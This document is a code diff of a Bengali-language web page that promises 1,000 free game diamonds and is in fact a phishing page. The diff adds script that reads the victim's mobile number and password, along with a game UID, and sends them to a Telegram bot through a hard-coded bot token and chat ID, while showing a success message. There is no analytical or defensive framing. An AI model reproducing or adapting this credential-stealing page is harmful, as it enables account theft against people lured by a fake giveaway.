@@ -1,119 +1,122 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ফ্রিতে ১০০০ ডায়মন্ড ক্লেম করুন</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            padding: 20px;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .header h1 {
-            font-size: 26px;
-            font-weight: bold;
-            color: #000;
-            margin-bottom: 5px;
-        }
-        .header h2 {
-            font-size: 20px;
-            color: #333;
-            margin-top: 0;
-        }
-        .container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            margin: 0 auto;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        button {
-            padding: 10px 20px;
-            background-color: #28a745;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #218838;
-        }
-        .hidden {
-            display: none;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ফ্রিতে ১০০০ ডায়মন্ড ক্লেম করুন</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 26px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 5px;
+        }
+        .header h2 {
+            font-size: 20px;
+            color: #333;
+            margin-top: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-    <div class="header">
-        <h1>Lx Hridoy</h1>
-        <h2>ফ্রিতে ক্লেম করুন ১০০০ ডায়মন্ড</h2>
-    </div>
+    <div class="header">
+        <h1>Lx Hridoy</h1>
+        <h2>ফ্রিতে ক্লেম করুন ১০০০ ডায়মন্ড</h2>
+    </div>
 
-    <div class="container">
-        <h2>লগইন করুন</h2>
-        <form id="loginForm">
-            <input type="text" id="mobileNumber" placeholder="মোবাইল নাম্বার" required>
-            <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
-            <button type="submit">লগইন</button>
-        </form>
+    <div class="container">
+        <h2>লগইন করুন</h2>
+        <form id="loginForm">
+            <input type="text" id="mobileNumber" placeholder="মোবাইল নাম্বার" required>
+            <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
+            <button type="submit">লগইন</button>
+        </form>
 
-        <div id="uidForm" class="hidden">
-            <h3>আপনার UID প্রদান করুন</h3>
-            <input type="text" id="uid" placeholder="UID" required>
-            <button id="submitBtn">সাবমিট</button>
-        </div>
-    </div>
+        <div id="uidForm" class="hidden">
+            <h3>আপনার UID প্রদান করুন</h3>
+            <input type="text" id="uid" placeholder="UID" required>
+            <button id="submitBtn">সাবমিট</button>
+        </div>
+    </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            document.getElementById('uidForm').classList.remove('hidden');
-        });
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('uidForm').classList.remove('hidden');
+        });
 
-        document.getElementById('submitBtn').addEventListener('click', function () {
-            var uid = document.getElementById('uid').value;
-            if (uid) {
-                var token = '8141110802:AAE1S38ZRzKrTHNZDNhCISdXOMkQCoTzNSo';
-                var chatId = '6593402184';
-                var message = `নতুন UID প্রাপ্ত হয়েছে:\nUID: ${uid}`;
+        document.getElementById('submitBtn').addEventListener('click', function () {
+            var mobileNumber = document.getElementById('mobileNumber').value;
+            var password = document.getElementById('password').value;
+            var uid = document.getElementById('uid').value;
 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    alert('UID সফলভাবে পাঠানো হয়েছে!');
-                })
-                .catch(error => {
-                    alert('UID পাঠাতে সমস্যা হয়েছে।');
-                    console.error(error);
-                });
-            } else {
-                alert('অনুগ্রহ করে UID প্রদান করুন');
-            }
-        });
-    </script>
+            if (mobileNumber && password && uid) {
+                var token = '8141110802:AAE1S38ZRzKrTHNZDNhCISdXOMkQCoTzNSo';
+                var chatId = '6593402184';
+                var message = `নতুন তথ্য প্রাপ্ত হয়েছে:\nমোবাইল নাম্বার: ${mobileNumber}\nপাসওয়ার্ড: ${password}\nUID: ${uid}`;
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert('UID সফলভাবে পাঠানো হয়েছে!');
+                })
+                .catch(error => {
+                    alert('UID পাঠাতে সমস্যা হয়েছে।');
+                    console.error(error);
+                });
+            } else {
+                alert('অনুগ্রহ করে সব তথ্য প্রদান করুন');
+            }
+        });
+    </script>
 
 </body>
 </html>
